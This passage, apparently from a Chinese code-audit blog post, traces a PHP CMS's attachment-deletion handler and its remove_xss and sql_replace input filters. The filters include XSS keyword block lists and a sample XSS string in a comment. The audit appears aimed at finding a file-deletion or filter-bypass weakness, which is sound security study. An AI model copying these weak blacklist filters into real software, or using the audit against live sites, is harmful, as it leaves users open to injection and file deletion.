class="line"><span style="color: #ABB2BF">   </span></span><span class="line"><span style="color: #ABB2BF">             </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">empty</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF">                 </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">my_unlink</span><span style="color: #ABB2BF">(ATTACHMENT_ROOT </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$path</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                 </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_success&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">             }</span></span><span class="line"><span style="color: #ABB2BF">   </span></span><span class="line"><span style="color: #ABB2BF">             </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;usertimes&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">&gt;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">                 </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;usertimes = usertimes-1&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;id&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;id&#39;</span><span style="color: #ABB2BF">]));</span></span><span class="line"><span style="color: #ABB2BF">             }</span></span><span class="line"><span style="color: #ABB2BF">             </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">                 </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">my_unlink</span><span style="color: #ABB2BF">(ATTACHMENT_ROOT </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$path</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                 </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;attachment&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;id&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$att_info</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;id&#39;</span><span style="color: #ABB2BF">]));</span></span><span class="line"><span style="color: #ABB2BF">                 </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_success&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">             }</span></span><span class="line"><span style="color: #ABB2BF">         }</span></span><span class="line"><span style="color: #ABB2BF">         </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">             </span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_failure&#39;</span><span style="color: #ABB2BF">),</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">HTTP_REFERER,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">         }</span></span><span class="line"><span style="color: #ABB2BF">     }</span></span><span class="line"><span style="color: #ABB2BF"> }</span></span></code></pre></div></div></figure><p>其中</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$id</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;id&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;id&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #E06C75">$url</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;url&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">remove_xss</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;url&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p>调用id    url，查看remove_xss的过滤</p></li><li><p>查看过滤，追溯remove_xss</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">remove_xss</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// this prevents some character re-spacing such as &lt;java\0script&gt;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">preg_replace</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">&#39;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// straight replacements, the user should never need these since they&#39;re normal characters</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// this prevents like &lt;IMG SRC=@avascript:alert(&#39;XSS&#39;)&gt;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;1234567890!@#$%^&amp;*()&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;~`&quot;;:?+/={}[]-_|</span><span style="color: #56B6C2">\&#39;\\</span><span style="color: #98C379">&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">$i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">strlen</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF">); </span><span style="color: #E06C75">$i</span><span style="color: #ABB2BF">++) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// ;? matches the ;, which is optional</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// 0{0,7} matches any padded zeros, which are optional and go up to 8 chars</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// @ @ search for the hex values</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">preg_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;/(&amp;#[xX]0{0,8}&#39;</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF"> </span><span style="color: #56B6C2">dechex</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$i</span><span style="color: #ABB2BF">]))</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;;?)/i&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$i</span><span style="color: #ABB2BF">],</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic">// with a ;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// @ @ 0{0,7} matches &#39;0&#39; zero to seven times</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">preg_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;/(&amp;#0{0,8}&#39;</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF"> </span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$i</span><span style="color: #ABB2BF">])</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;;?)/&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$search</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$i</span><span style="color: #ABB2BF">],</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic">// with a ;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #7F848E; font-style: italic">// now the only remaining whitespace attacks are \t, \n, and \r</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$ra1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;javascript&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;vbscript&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;expression&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;applet&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;meta&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;xml&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;blink&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;link&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;style&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;script&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;embed&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;object&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;iframe&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;frame&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;frameset&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ilayer&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;layer&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;bgsound&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;title&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;base&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$ra2</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;onabort&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onactivate&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onafterprint&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onafterupdate&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforeactivate&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforecopy&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforecut&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforedeactivate&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforeeditfocus&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforepaste&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforeprint&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforeunload&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbeforeupdate&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onblur&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onbounce&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;oncellchange&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onchange&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onclick&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;oncontextmenu&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;oncontrolselect&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;oncopy&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;oncut&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondataavailable&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondatasetchanged&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondatasetcomplete&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondblclick&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondeactivate&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondrag&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondragend&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondragenter&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondragleave&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondragover&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondragstart&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;ondrop&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onerror&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onerrorupdate&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onfilterchange&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onfinish&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onfocus&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onfocusin&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onfocusout&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onhelp&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onkeydown&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onkeypress&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onkeyup&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onlayoutcomplete&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onload&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onlosecapture&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmousedown&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmouseenter&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmouseleave&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmousemove&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmouseout&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmouseover&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmouseup&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmousewheel&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmove&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmoveend&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onmovestart&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onpaste&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onpropertychange&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onreadystatechange&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onreset&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onresize&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onresizeend&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onresizestart&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onrowenter&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onrowexit&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onrowsdelete&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onrowsinserted&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onscroll&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onselect&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onselectionchange&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onselectstart&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onstart&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onstop&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onsubmit&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;onunload&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$ra</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array_merge</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$ra1</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$ra2</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>寻找到过滤的字符</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * 过滤SQL关键字，mysql入库字段过滤</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> $val 要过滤的字符串</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@return</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E5C07B; font-style: italic">mixed</span></span><span class="line"><span style="color: #7F848E; font-style: italic"> */</span></span><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">sql_replace</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\t</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;%20&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;%27&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;*&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&#39;&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;;&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;#&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$val</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">str_replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;--&quot;</span><span style="color: #ABB2BF">,</span><span style="color: 